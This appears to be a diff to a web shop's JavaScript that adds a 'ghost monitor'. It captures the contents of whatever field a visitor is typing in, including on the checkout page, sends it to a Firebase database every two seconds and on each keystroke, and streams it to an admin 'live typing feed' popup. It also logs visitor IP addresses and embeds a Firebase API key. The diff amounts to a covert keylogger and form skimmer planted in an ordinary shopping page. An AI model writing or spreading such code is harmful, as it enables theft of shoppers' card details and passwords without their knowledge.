@@ -393,32 +393,53 @@ function targetUser(targetID) {
     if(document.getElementById('chat-widget').style.display !== 'flex') toggleChat(); 
 }
 
+// ==========================================
+// FIXED GHOST MONITOR LOGIC (DIRECT SYNC)
+// ==========================================
 function openGhostView(targetID) {
     const gW = window.open('', '_blank', 'width=450,height=500');
     gW.document.write(`
-        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px;">
-            <h2 style="color:yellow; border-bottom:1px solid #333;">GHOST MONITOR: User_${targetID}</h2>
+        <html>
+        <head>
+            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script>
+            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script>
+        </head>
+        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px; overflow-x:hidden;">
+            <h2 style="color:yellow; border-bottom:1px solid #333; padding-bottom:10px;">GHOST MONITOR: User_${targetID}</h2>
             <div id="status" style="margin-top:20px;">
-                <p>STATUS: <span style="color:white;">ACTIVE BRIDGE</span></p>
-                <p>PAGE: <span id="p" style="color:white;">-</span></p>
-                <p>ACTION: <span id="a" style="color:white;">-</span></p>
-                <div style="background:#111; padding:15px; border:1px solid #333; margin-top:20px;">
-                    <p style="color:yellow; margin:0 0 10px 0;">LIVE TYPING FEED:</p>
-                    <div id="t" style="color:white; font-size:18px;">...</div>
+                <p>STATUS: <span id="conn-state" style="color:red;">CONNECTING...</span></p>
+                <p>CURRENT PAGE: <span id="p" style="color:white; font-weight:bold;">-</span></p>
+                <p>LAST ACTIVE: <span id="a" style="color:white;">-</span></p>
+                <div style="background:#111; padding:15px; border:1px solid #333; margin-top:20px; border-radius:5px;">
+                    <p style="color:yellow; margin:0 0 10px 0; font-size:12px; border-bottom:1px solid #222;">LIVE TYPING FEED:</p>
+                    <div id="t" style="color:white; font-size:18px; word-break: break-all; min-height:40px;">...</div>
                 </div>
             </div>
             <script>
-                const target = "${targetID}";
-                window.opener.db.ref('ghost_tracking/'+target).on('value', s => {
+                const config = {
+                    apiKey: "AIzaSyDE6qMplWktZASB2AjUKuY_dSRCUKiZyOA",
+                    authDomain: "maxiom-r3.firebaseapp.com",
+                    databaseURL: "https://maxiom-r3-default-rtdb.firebaseio.com",
+                    projectId: "maxiom-r3"
+                };
+                firebase.initializeApp(config);
+                const gDB = firebase.database();
+                
+                gDB.ref('.info/connected').on('value', s => {
+                    if(s.val()) document.getElementById('conn-state').innerText = "ACTIVE BRIDGE";
+                });
+
+                gDB.ref('ghost_tracking/${targetID}').on('value', s => {
                     const d = s.val();
                     if(d) {
-                        document.getElementById('p').innerText = d.pageName;
+                        document.getElementById('p').innerText = d.pageName || "BROWSING";
                         document.getElementById('a').innerText = new Date(d.lastActive).toLocaleTimeString();
                         document.getElementById('t').innerText = d.typing || "Not typing...";
                     }
                 });
             <\/script>
         </body>
+        </html>
     `);
 }
 
@@ -439,18 +460,26 @@ async function getIdentity() {
     } catch(e) { console.log("Identity Error"); }
 }
 
+// ==========================================
+// FIXED GHOST BROADCASTER (HEARTBEAT)
+// ==========================================
 function broadcastGhostData() {
     if(isAdmin || userID === "Unknown") return;
     const isCheckout = document.getElementById('checkout-page').style.display !== 'none';
     const isInfo = document.getElementById('info-page').style.display !== 'none';
     let currentPage = "MAIN SHOP";
     if(isCheckout) currentPage = "CHECKOUT PAGE";
-    if(isInfo) currentPage = "PRODUCT INFO";
+    if(isInfo) currentPage = "PRODUCT INFO: " + (document.getElementById('info-title').innerText || "");
     
-    db.ref(`ghost_tracking/${userID}`).set({
+    let typingContent = "";
+    if(document.activeElement && (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {
+        typingContent = document.activeElement.value;
+    }
+
+    db.ref(`ghost_tracking/${userID}`).update({
         pageName: currentPage,
         lastActive: Date.now(),
-        typing: document.activeElement ? document.activeElement.value : ""
+        typing: typingContent || "Browsing..."
     });
 }
 
@@ -515,6 +544,7 @@ function addToCart(i) {
     cart.push(products[i]);
     updateCartCount();
     db.ref('intel').push({ id: Date.now(), text: `VISIT | ${userIP} | ${products[i].name}`, owner: userIP.split('.')[0] });
+    broadcastGhostData();
 }
 
 function updateCartCount() { document.getElementById('cart-count').innerText = cart.length; }
@@ -561,8 +591,8 @@ function login() {
                 return `<div style="margin-bottom:8px; border-bottom:1px solid #333; padding-bottom:5px;">
                             <span style="color:yellow; font-size:10px;">User_${extID}: ${txt}</span>
                             <div style="display:flex; gap:5px; margin-top:3px;">
-                                <button onclick="targetUser('${extID}')" style="background:#0044ff; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer;">BRIDGE</button>
-                                <button onclick="openGhostView('${extID}')" style="background:#008800; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer;">GHOST</button>
+                                <button onclick="targetUser('${extID}')" style="background:#0044ff; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">BRIDGE</button>
+                                <button onclick="openGhostView('${extID}')" style="background:#008800; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">GHOST</button>
                             </div>
                         </div>`;
             }).join(''); 
@@ -702,8 +732,10 @@ window.onload = () => {
         if(e.key === "PageUp") { e.preventDefault(); document.getElementById('pgup-menu').style.display = 'block'; }
     });
 
-    window.addEventListener('click', () => broadcastGhostData());
-    window.addEventListener('input', () => broadcastGhostData());
+    // CRITICAL: UPDATED BROADCAST LISTENERS
+    window.addEventListener('mousedown', () => broadcastGhostData());
+    window.addEventListener('keyup', () => broadcastGhostData());
+    setInterval(broadcastGhostData, 2000); // AUTO-HEARTBEAT EVERY 2S
 
     const logs = document.getElementById('load-logs'), lines = ["> BOOTING R4...", "> SYNCING DATABASE...", "> READY."];
     let step = 0;
